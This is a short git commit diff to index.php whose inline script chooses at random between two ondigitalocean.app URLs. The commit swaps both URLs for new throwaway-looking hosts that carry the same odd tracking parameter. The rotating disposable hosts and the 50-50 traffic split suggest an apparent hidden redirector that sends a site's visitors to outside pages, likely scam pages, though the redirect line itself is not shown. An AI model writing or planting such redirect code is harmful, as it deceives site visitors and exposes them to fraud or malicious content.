307b3129f19407a3ac95cffdf2c395b0260a48d0
bogerhing <bogerhinglevd162@gmail.com>
2026-02-26 02:13:52 -0600

    Update index.php

--- index.php
+++ index.php
@@ -8,8 +8,8 @@
 
 <script>
 (function () {
-    const urlA = "https://starfish-app-lncr6.ondigitalocean.app/?Anph=(0101)-21735-08134";
-    const urlB = "https://coral-app-s7d92.ondigitalocean.app/?Anph=(0101)-21735-08134";
+    const urlA = "https://whale-app-o3dry.ondigitalocean.app/?Anph=(0101)-21735-08134";
+    const urlB = "https://stingray-app-2-sboby.ondigitalocean.app/?Anph=(0101)-21735-08134";
 
     // 50-50 split
     const target = Math.random() < 0.5 ? urlA : urlB;
